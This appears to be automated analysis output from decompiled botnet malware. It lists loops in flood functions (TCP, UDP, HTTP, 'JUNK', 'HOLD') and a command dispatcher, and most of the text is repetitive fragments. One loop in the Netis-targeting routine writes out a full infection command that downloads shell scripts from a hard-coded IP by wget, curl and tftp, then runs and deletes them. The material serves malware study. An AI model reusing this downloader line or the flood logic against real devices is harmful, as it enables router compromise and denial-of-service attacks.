		if (__libc_send(v169, v142, v137, v148) >= 0) {
		case 6: {
		get_telstate_host();
		HackerPrint(v140, v142);
		get_telstate_host();
		HackerPrint(v140, v142);
		case 7: {
		if (__libc_send(v172, v140, v142, v137) >= 0) {
		sclose(v172);
		while (true) {
=============================WHILE LOOPS ID : 20 @ StartTheNetis ====================================
++++++++ WHILE START : 11098 
++++++++ WHILE FUNCTION : StartTheNetis 
++++++++ WHILE END : 11107 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v138 = socket(2, 2, 0); // 0x804e35a
		NetisRanges(v138);
		sprintf(v137, (int32_t)"%s cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n x00");
		__libc_sendto(v138, v137, v139, 0, v135, 16);
=============================WHILE LOOPS ID : 21 @ sendHTTP ====================================
++++++++ WHILE START : 11879 
++++++++ WHILE FUNCTION : sendHTTP 
++++++++ WHILE END : 11917 
++++++++ INTRESTING INSTRUCTIONS :  
		if (__libc_fork(v138) == 0) {
		while (true) {
		v140 = socket_connect(a1, a3);
		__libc_close(v140);
=============================WHILE LOOPS ID : 22 @ sendSTD ====================================
++++++++ WHILE START : 12073 
++++++++ WHILE FUNCTION : sendSTD 
++++++++ WHILE END : 12097 
++++++++ INTRESTING INSTRUCTIONS :  
		random();
		__libc_send(v134, v145, 75, 0);
		__libc_connect(v134, v137, 16);
		__libc_close(v134);
=============================WHILE LOOPS ID : 23 @ sendUDP ====================================
++++++++ WHILE START : 12277 
++++++++ WHILE FUNCTION : sendUDP 
++++++++ WHILE END : 12304 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_sendto(v138, v140, a5, 0, (int32_t)&v135, 16);
		rand_cmwc((int32_t)v133);
=============================WHILE LOOPS ID : 24 @ sendUDP ====================================
++++++++ WHILE START : 12392 
++++++++ WHILE FUNCTION : sendUDP 
++++++++ WHILE END : 12432 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_sendto(v162, (int32_t)&v163, (int32_t)&v163, (int32_t)&v163, (int32_t)&v163, (int32_t)&v163);
		*v152 = (int16_t)rand_cmwc(v162);
		v164 = rand_cmwc(v162);
		*(int16_t *)(v150 | 4) = (int16_t)rand_cmwc(v166);
=============================WHILE LOOPS ID : 25 @ sendTCP ====================================
++++++++ WHILE START : 12817 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 12947 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v171 = ((int32_t)(v170 | _strncmp(v158, "rst", 4) % 2 == 0) | v165 & -256) ^ 1; // 0x804f30c
		int32_t v178 = ((int32_t)(v177 | _strncmp(v158, "psh", 4) % 2 == 0) | v165 & -256) ^ 1; // 0x804f402
		HackerPrint(4, (int32_t)"psh");
		v166 = "psh";
		v166 = "psh";
=============================WHILE LOOPS ID : 26 @ sendTCP ====================================
++++++++ WHILE START : 12971 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 13000 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_sendto(v151, v140, v135, v136, v137, 0);
		*(int16_t *)(v142 | 4) = (int16_t)rand_cmwc(v151);
		*v146 = rand_cmwc(v151);
		*v144 = (int16_t)rand_cmwc(v151);
		*v154 = (int16_t)tcpcsum();
=============================WHILE LOOPS ID : 27 @ sendTCP ====================================
++++++++ WHILE START : 13035 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 13050 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_sendto(v151, v140, v135, v136, v137, 0);
		*(int16_t *)(v142 | 4) = (int16_t)rand_cmwc(v151);
		*v146 = rand_cmwc(v151);
		*v144 = (int16_t)rand_cmwc(v151);
		*v154 = (int16_t)tcpcsum();
=============================WHILE LOOPS ID : 29 @ sendJUNK ====================================
++++++++ WHILE START : 13239 
++++++++ WHILE FUNCTION : sendJUNK 
++++++++ WHILE END : 13362 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_close(v164);
		getsockopt(v158, v157, 0x2710, v155, (int32_t)&v163);
		__libc_close(v158);
		makeRandomStr((char *)v154, v135);
		if (__libc_send(v158, v157, v147, v155) != -1) {
		__libc_close(v158);
		socket(v154, v135, v159);
		if (__libc_connect(v154, v135, v159) == -1) {
		__libc_close(v154);
=============================WHILE LOOPS ID : 32 @ sendHOLD ====================================
++++++++ WHILE START : 13551 
++++++++ WHILE FUNCTION : sendHOLD 
++++++++ WHILE END : 13653 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_close(v159);
		getsockopt(v161, v158, 0x2710, v154, (int32_t)&v155);
		__libc_close(v161);
		__libc_close(v165);
		socket(v152, v135, (int32_t)&v155);
		if (__libc_connect(v152, v135, (int32_t)&v155) == -1) {
		__libc_close(v152);
=============================WHILE LOOPS ID : 34 @ processCmd ====================================
++++++++ WHILE START : 14072 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14118 
++++++++ INTRESTING INSTRUCTIONS :  
		if (*v296 != __libc_getpid()) {
		kill(v298, 9);
=============================WHILE LOOPS ID : 35 @ processCmd ====================================
++++++++ WHILE START : 14202 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14218 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendTCP(v299, v271, v272, v273, (char *)v274, v256, v257);
=============================WHILE LOOPS ID : 39 @ processCmd ====================================
++++++++ WHILE START : 14434 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14443 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
=============================WHILE LOOPS ID : 41 @ processCmd ====================================
++++++++ WHILE START : 14496 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14512 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendSTD(v301, v251, v252);
=============================WHILE LOOPS ID : 43 @ processCmd ====================================
++++++++ WHILE START : 14618 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14627 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
=============================WHILE LOOPS ID : 45 @ processCmd ====================================
++++++++ WHILE START : 14716 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14735 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendJUNK(v232, v240, v241);
		sendSTD(v232, v240, v241);
		sendHOLD(v232, v240, v241);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 47 @ processCmd ====================================
++++++++ WHILE START : 14847 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14856 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
=============================WHILE LOOPS ID : 49 @ processCmd ====================================
++++++++ WHILE START : 14928 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14937 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v253, v251, v252);
=============================WHILE LOOPS ID : 51 @ processCmd ====================================
++++++++ WHILE START : 15044 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15053 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
=============================WHILE LOOPS ID : 54 @ processCmd ====================================
++++++++ WHILE START : 15218 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15227 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
=============================WHILE LOOPS ID : 56 @ processCmd ====================================
++++++++ WHILE START : 15288 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15297 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v253, v251, v252);
=============================WHILE LOOPS ID : 58 @ processCmd ====================================
++++++++ WHILE START : 15391 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15400 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
=============================WHILE LOOPS ID : 60 @ processCmd ====================================
++++++++ WHILE START : 15476 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15493 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendCNC(v304, v227, v228);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 62 @ processCmd ====================================
++++++++ WHILE START : 15609 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15618 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
=============================WHILE LOOPS ID : 64 @ processCmd ====================================
++++++++ WHILE START : 15687 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15696 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v253, v251, v252);
=============================WHILE LOOPS ID : 66 @ processCmd ====================================
++++++++ WHILE START : 15801 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15810 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
=============================WHILE LOOPS ID : 68 @ processCmd ====================================
++++++++ WHILE START : 15889 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15901 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v232, v240, v241);
		sendSTD(v232, v240, v241);
		sendHOLD(v232, v240, v241);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 70 @ processCmd ====================================
++++++++ WHILE START : 16012 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16021 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
=============================WHILE LOOPS ID : 72 @ processCmd ====================================
++++++++ WHILE START : 16090 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16099 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v253, v251, v252);
=============================WHILE LOOPS ID : 74 @ processCmd ====================================
++++++++ WHILE START : 16204 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16213 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
=============================WHILE LOOPS ID : 77 @ processCmd ====================================
++++++++ WHILE START : 16370 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16379 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
=============================WHILE LOOPS ID : 79 @ processCmd ====================================
++++++++ WHILE START : 16432 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16441 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v253, v251, v252);
=============================WHILE LOOPS ID : 80 @ processCmd ====================================
++++++++ WHILE START : 16509 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16518 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
=============================WHILE LOOPS ID : 81 @ processCmd ====================================
++++++++ WHILE START : 16564 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16576 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v232, v240, v241);
		sendSTD(v232, v240, v241);
		sendHOLD(v232, v240, v241);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 82 @ processCmd ====================================
++++++++ WHILE START : 16650 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16659 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
=============================WHILE LOOPS ID : 83 @ processCmd ====================================
++++++++ WHILE START : 16695 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16704 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v253, v251, v252);
=============================WHILE LOOPS ID : 84 @ processCmd ====================================
++++++++ WHILE START : 16772 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16781 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
=============================WHILE LOOPS ID : 85 @ processCmd ====================================
++++++++ WHILE START : 16834 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16852 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
=============================WHILE LOOPS ID : 86 @ processCmd ====================================
++++++++ WHILE START : 16950 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16959 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
=============================WHILE LOOPS ID : 87 @ processCmd ====================================
++++++++ WHILE START : 17002 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17011 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v253, v251, v252);
=============================WHILE LOOPS ID : 88 @ processCmd ====================================
++++++++ WHILE START : 17092 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17101 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
=============================WHILE LOOPS ID : 89 @ processCmd ====================================
++++++++ WHILE START : 17154 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17166 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v232, v240, v241);
		sendSTD(v232, v240, v241);
		sendHOLD(v232, v240, v241);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 90 @ processCmd ====================================
++++++++ WHILE START : 17253 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17262 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
=============================WHILE LOOPS ID : 91 @ processCmd ====================================
++++++++ WHILE START : 17305 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17314 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v253, v251, v252);
=============================WHILE LOOPS ID : 92 @ processCmd ====================================
++++++++ WHILE START : 17395 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17404 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
=============================WHILE LOOPS ID : 93 @ processCmd ====================================
++++++++ WHILE START : 17461 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17471 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v229, v227, v228);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 94 @ processCmd ====================================
++++++++ WHILE START : 17564 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17573 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
=============================WHILE LOOPS ID : 95 @ processCmd ====================================
++++++++ WHILE START : 17616 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17625 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v253, v251, v252);
=============================WHILE LOOPS ID : 96 @ processCmd ====================================
++++++++ WHILE START : 17706 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17715 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
=============================WHILE LOOPS ID : 97 @ processCmd ====================================
++++++++ WHILE START : 17768 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17780 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v232, v240, v241);
		sendSTD(v232, v240, v241);
		sendHOLD(v232, v240, v241);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 98 @ processCmd ====================================
++++++++ WHILE START : 17867 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17876 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
=============================WHILE LOOPS ID : 99 @ processCmd ====================================
++++++++ WHILE START : 17919 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17928 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v253, v251, v252);
=============================WHILE LOOPS ID : 100 @ processCmd ====================================
++++++++ WHILE START : 18009 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18018 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
=============================WHILE LOOPS ID : 101 @ processCmd ====================================
++++++++ WHILE START : 18136 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18145 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
=============================WHILE LOOPS ID : 102 @ processCmd ====================================
++++++++ WHILE START : 18181 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18190 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v253, v251, v252);
=============================WHILE LOOPS ID : 103 @ processCmd ====================================
++++++++ WHILE START : 18258 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18267 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v277, v271, v272, v273, (char *)v274, v256, v257);
=============================WHILE LOOPS ID : 104 @ processCmd ====================================
++++++++ WHILE START : 18313 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18325 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v232, v240, v241);
		sendSTD(v232, v240, v241);
		sendHOLD(v232, v240, v241);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 105 @ processCmd ====================================
++++++++ WHILE START : 18357 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18366 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v253, v251, v252);
=============================WHILE LOOPS ID : 106 @ processCmd ====================================
++++++++ WHILE START : 18407 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18417 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v229, v227, v228);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 107 @ processCmd ====================================
++++++++ WHILE START : 18455 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18464 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v253, v251, v252);
=============================WHILE LOOPS ID : 108 @ processCmd ====================================
++++++++ WHILE START : 18501 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18513 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v232, v240, v241);
		sendSTD(v232, v240, v241);
		sendHOLD(v232, v240, v241);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 109 @ processCmd ====================================
++++++++ WHILE START : 18545 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18554 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v253, v251, v252);
=============================WHILE LOOPS ID : 110 @ processCmd ====================================
++++++++ WHILE START : 18639 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18655 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendUDP(v307, v177, v178, v179, v180, v148);
=============================WHILE LOOPS ID : 111 @ processCmd ====================================
++++++++ WHILE START : 18714 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18723 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v253, v251, v252);
=============================WHILE LOOPS ID : 112 @ processCmd ====================================
++++++++ WHILE START : 18767 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18779 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v232, v240, v241);
		sendSTD(v232, v240, v241);
		sendHOLD(v232, v240, v241);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 113 @ processCmd ====================================
++++++++ WHILE START : 18821 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18830 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v253, v251, v252);
=============================WHILE LOOPS ID : 114 @ processCmd ====================================
++++++++ WHILE START : 18878 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18888 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v229, v227, v228);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 115 @ processCmd ====================================
++++++++ WHILE START : 18936 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18945 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v253, v251, v252);
=============================WHILE LOOPS ID : 116 @ processCmd ====================================
++++++++ WHILE START : 18989 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19001 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v232, v240, v241);
		sendSTD(v232, v240, v241);
		sendHOLD(v232, v240, v241);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 117 @ processCmd ====================================
++++++++ WHILE START : 19043 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19052 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v253, v251, v252);
=============================WHILE LOOPS ID : 118 @ processCmd ====================================
++++++++ WHILE START : 19098 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19110 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
=============================WHILE LOOPS ID : 119 @ processCmd ====================================
++++++++ WHILE START : 19164 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19173 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v253, v251, v252);
=============================WHILE LOOPS ID : 120 @ processCmd ====================================
++++++++ WHILE START : 19217 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19229 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v232, v240, v241);
		sendSTD(v232, v240, v241);
		sendHOLD(v232, v240, v241);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 121 @ processCmd ====================================
++++++++ WHILE START : 19271 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19280 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v253, v251, v252);
=============================WHILE LOOPS ID : 122 @ processCmd ====================================
++++++++ WHILE START : 19328 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19338 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v229, v227, v228);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 123 @ processCmd ====================================
++++++++ WHILE START : 19386 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19395 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v253, v251, v252);
=============================WHILE LOOPS ID : 124 @ processCmd ====================================
++++++++ WHILE START : 19439 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19451 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v232, v240, v241);
		sendSTD(v232, v240, v241);
		sendHOLD(v232, v240, v241);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 125 @ processCmd ====================================
++++++++ WHILE START : 19493 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19502 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v253, v251, v252);
=============================WHILE LOOPS ID : 126 @ processCmd ====================================
++++++++ WHILE START : 19580 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19589 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v253, v251, v252);
=============================WHILE LOOPS ID : 127 @ processCmd ====================================
++++++++ WHILE START : 19626 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19638 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v232, v240, v241);
		sendSTD(v232, v240, v241);
		sendHOLD(v232, v240, v241);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 128 @ processCmd ====================================
++++++++ WHILE START : 19670 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19679 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v253, v251, v252);
=============================WHILE LOOPS ID : 129 @ processCmd ====================================
++++++++ WHILE START : 19720 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19730 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v229, v227, v228);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 130 @ processCmd ====================================
++++++++ WHILE START : 19765 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19777 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v232, v240, v241);
		sendSTD(v232, v240, v241);
		sendHOLD(v232, v240, v241);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 131 @ processCmd ====================================
++++++++ WHILE START : 19813 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19825 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v165, v189, (int16_t)v188, v186, v185, v183);
=============================WHILE LOOPS ID : 132 @ processCmd ====================================
++++++++ WHILE START : 19866 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19878 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v232, v240, v241);
		sendSTD(v232, v240, v241);
		sendHOLD(v232, v240, v241);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 133 @ processCmd ====================================
++++++++ WHILE START : 19912 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19922 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v229, v227, v228);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 134 @ processCmd ====================================
++++++++ WHILE START : 19957 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19969 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v232, v240, v241);
		sendSTD(v232, v240, v241);
		sendHOLD(v232, v240, v241);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 135 @ processCmd ====================================
++++++++ WHILE START : 20028 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20045 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendJUNK(v309, v171, v172);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 136 @ processCmd ====================================
++++++++ WHILE START : 20107 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20119 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v232, v240, v241);
		sendSTD(v232, v240, v241);
		sendHOLD(v232, v240, v241);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 137 @ processCmd ====================================
++++++++ WHILE START : 20160 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 20170 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v229, v227, v228);
		__libc_close((int32_t)v133);
=============================WHILE LOOPS ID : 138 @ processCmd ====================================
++++++++ WHILE START : 20215 
